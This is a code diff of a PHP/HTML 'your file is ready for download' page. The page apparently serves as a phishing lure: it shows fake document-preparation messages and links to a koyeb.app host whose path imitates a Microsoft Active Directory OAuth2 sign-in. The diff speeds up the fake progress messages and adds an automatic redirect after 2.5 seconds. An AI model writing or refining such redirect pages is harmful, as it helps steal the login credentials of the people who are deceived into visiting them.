@@ -110,11 +110,12 @@ try {
             position: relative;
             background: #fff;
             padding: 20px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 15px #0078d7;
             border-radius: 5px;
             text-align: center;
             max-width: 400px;
-            opacity: 1;
+            opacity: 0;
+            animation: fadeIn 1s ease-in-out forwards;
         }
         .footer {
             font-size: 0.8rem;
@@ -145,38 +146,47 @@ try {
         <p>This page will redirect automatically in <span id="countdown">5</span> seconds.</p>
         <p class="footer">If not, <a href="https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/">click here</a>.</p>
     </div>
-
     <script>
-        let countdown = 5;
-        let topBar = document.getElementById('top-bar');
-        let messageBox = document.getElementById('message-box');
-        let message = document.getElementById('message');
+    let countdown = 2;
+    let topBar = document.getElementById('top-bar');
+    let messageBox = document.getElementById('message-box');
+    let message = document.getElementById('message');
 
-        // Stage 1: Preparing Document
-        setTimeout(() => {
-            topBar.textContent = 'Preparing Document...';
-            topBar.style.opacity = 1; // Fade in
-        }, 0);
+    // Stage 1: Preparing Document
+    setTimeout(() => {
+        topBar.textContent = 'Preparing Document...';
+        topBar.style.opacity = 1;
+    }, 0);
 
-        // Stage 2: Your File is Ready (fade out "Preparing Document" and fade in)
-        setTimeout(() => {
-            topBar.classList.add('fade-out');
-            topBar.textContent = 'Your file is ready for download!';
-            topBar.classList.remove('fade-out');
-        }, 2000);
+    // Stage 2: File Ready
+    setTimeout(() => {
+        topBar.classList.add('fade-out');
+        message.textContent = 'Your file is ready for download!';
+        messageBox.style.opacity = 1;
+    }, 800); // faster transition
 
-        // Stage 3: Redirecting in Progress (fade out "Your File is Ready" and fade in)
-        setTimeout(() => {
-            topBar.classList.add('fade-out');
-            topBar.textContent = 'Redirecting in Progress...';
-            topBar.classList.remove('fade-out');
-        }, 3000);
+    // Stage 3: Redirecting in Progress
+    setTimeout(() => {
+        messageBox.classList.add('fade-out');
+        topBar.textContent = 'Redirecting in Progress...';
+        topBar.style.opacity = 1;
+        message.textContent = 'You will be redirected shortly.';
+        messageBox.style.opacity = 1;
+    }, 1400); // earlier than 3000ms
 
-        // Countdown Timer
-        setInterval(() => {
-            document.getElementById('countdown').textContent = countdown;
-            if (countdown > 0) countdown--;
-        }, 1000);
-    </script>
+    // Countdown Timer
+    setInterval(() => {
+        document.getElementById('countdown').textContent = countdown;
+        if (countdown > 0) countdown--;
+    }, 1000);
+
+    // 🚀 Automatic Redirect after 2.5 seconds
+    setTimeout(() => {
+        window.location.href = "<?php echo htmlspecialchars($redirectUrl); ?>";
+    }, 2500);
+</script>
+
+
 </body>
 </html>
+
